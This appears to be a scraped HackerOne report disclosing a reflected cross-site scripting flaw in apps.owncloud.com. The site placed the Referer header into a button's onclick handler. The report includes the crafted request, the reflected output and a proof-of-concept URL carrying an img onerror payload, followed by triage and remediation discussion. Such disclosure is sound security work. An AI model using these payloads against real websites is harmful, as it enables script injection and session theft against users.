title: apps.owncloud.com: XSS via referrer

profile.name: ownCloud
profile.about: ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view.

vulnerability_information:
Look at next request:


Host: apps.owncloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://www.myevilsite.com/qwe';alert(1)+'


in response page referrer pasts into onclick event of a cancel button

onclick="location.href='http://www.myevilsite.com/qwe';alert(1)+'?PHPSESSID=icqgmh3h639vn6a75j6idmj935'" />
vulnerability_information_html:
Look at next request:

Host: apps.owncloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0

Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://www.myevilsite.com/qwe';alert(1)+'

in response page referrer pasts into onclick event of a cancel button

onclick="location.href='http://www.myevilsite.com/qwe';alert(1)+'?PHPSESSID=icqgmh3h639vn6a75j6idmj935'" />

activities.message: Thanks. I can confirm this vulnerability and escalated this to the platform owner.
activities.markdown_message: Thanks. I can confirm this vulnerability and escalated this to the platform owner.

activities.message: @psych0tr1a After some research, i have found no way to exploit this XSS, becuase Browsers send the Referral header encoded, which migrates this XSS, Could you please give me a POC that how you are able to exploit this XSS in Referral header?
activities.markdown_message: @psych0tr1a After some research, i have found no way to exploit this XSS, becuase Browsers send the Referral header encoded, which migrates this XSS, Could you please give me a POC that how you are able to exploit this XSS in Referral header?

@ashesh That's a funny thing. Indeed, most browsers tend to do this (also for some other stuff) and thus automatically protect the user but at least some Microsoft Internet Explorer barely encodes stuff.

Thus this can to my knowledge be exploited with IE but not with FF or Chrome. (which makes this a little bit less risky as most of our users use another browser)

See http://sec101.sourceforge.net/ie-referer-xsser.php for a proof of concept.

activities.message: Yea, i was just shocked to see the POC worked! POC: `http://sec101.sourceforge.net/referer-xss/?s=">&u=https://apps.owncloud.com/messages/?action=newmessage&username=anderslund` >Just a tip for you @lukasreschke , you don't need to triage report two times in a row, until you have closed the report in between.
activities.markdown_message:
Yea, i was just shocked to see the POC worked!

POC: http://sec101.sourceforge.net/referer-xss/?s="><img src=1 onerror=alert(document.domain+String.fromCharCode(58,10,10,82,101,102,101,114,101,114,45,98,97,115,101,100,32,88,83,83,32,80,114,111,111,102,45,111,102,45,67,111,110,99,101,112,116,33))>&u=https://apps.owncloud.com/messages/?action=newmessage&username=anderslund

Just a tip for you @lukasreschke , you don't need to triage report two times in a row, until you have closed the report in between.

activities.message:
> Just a tip for you @lukasreschke , you don't need to triage report two times in a row, until you have closed the report in between.

In this case it was to add an internal reference to our bug tracker. Unfortunately HackerOne does not allow yet to modify the internal ticket reference without editing the state. - I will reach out to them and see if they can fix this :-)
activities.markdown_message:
Just a tip for you @lukasreschke , you don't need to triage report two times in a row, until you have closed the report in between.

In this case it was to add an internal reference to our bug tracker. Unfortunately HackerOne does not allow yet to modify the internal ticket reference without editing the state. - I will reach out to them and see if they can fix this :-)

activities.message:
@lukasreschke oh, so that was the reason.

Can i ask you what is the expected time for these reports (website related) to be fixed?
activities.markdown_message:
@lukasreschke oh, so that was the reason.

Can i ask you what is the expected time for these reports (website related) to be fixed?

activities.message:
There we have to differentiate between the different products:

- ownCloud Server: Generally fixed within days, patch cycle is monthly.
- ownCloud Android: Generally fixed within days, we may consider pushing immediate security updates.
- ownCloud Desktop: Generally fixed within days, minor patches are for regular release for critical ones we do emergency released.
- ownCloud iOS: Generally fixed within days, however Apple's review process makes it quite hard to push updates.

And then we have our infrastructure:

- owncloud.com: Depends on our website team, means this can take some time as we use a lot of third-party Wordpress plugins which may need to escalated upstream etc.
- apps.owncloud.com: Depends on a single person maintaining it busy with other tasks as well. I will talk to him about this today.
- owncloud.org: Quite easy to fix since no third-party plugins
activities.markdown_message:
There we have to differentiate between the different products:

  • ownCloud Server: Generally fixed within days, patch cycle is monthly.
  • ownCloud Android: Generally fixed within days, we may consider pushing immediate security updates.
  • ownCloud Desktop: Generally fixed within days, minor patches are for regular release for critical ones we do emergency released.
  • ownCloud iOS: Generally fixed within days, however Apple's review process makes it quite hard to push updates.

And then we have our infrastructure:

  • owncloud.com: Depends on our website team, means this can take some time as we use a lot of third-party Wordpress plugins which may need to escalated upstream etc.
  • apps.owncloud.com: Depends on a single person maintaining it busy with other tasks as well. I will talk to him about this today.
  • owncloud.org: Quite easy to fix since no third-party plugins

activities.message: That said, we already received reports  (though minor impact) within our defined scope (ownCloud Server + Sync Clients) and have paid out bounties for it but the patches are still pending review.
activities.markdown_message: That said, we already received reports (though minor impact) within our defined scope (ownCloud Server + Sync Clients) and have paid out bounties for it but the patches are still pending review.

activities.message: The owner of the platform believes that this issue has been addressed meanwhile.  Thanks a lot for reporting these issues back to us.
activities.markdown_message: The owner of the platform believes that this issue has been addressed meanwhile. Thanks a lot for reporting these issues back to us.

activities.message:
Thanks a lot for your report. Please note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure.

From our FAQ:
> **Q: Why do you exclude the ownCloud websites and infrastructure?**
> A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.

If you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/
activities.markdown_message:
Thanks a lot for your report. Please note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure.

From our FAQ:

Q: Why do you exclude the ownCloud websites and infrastructure?
A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.

If you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/
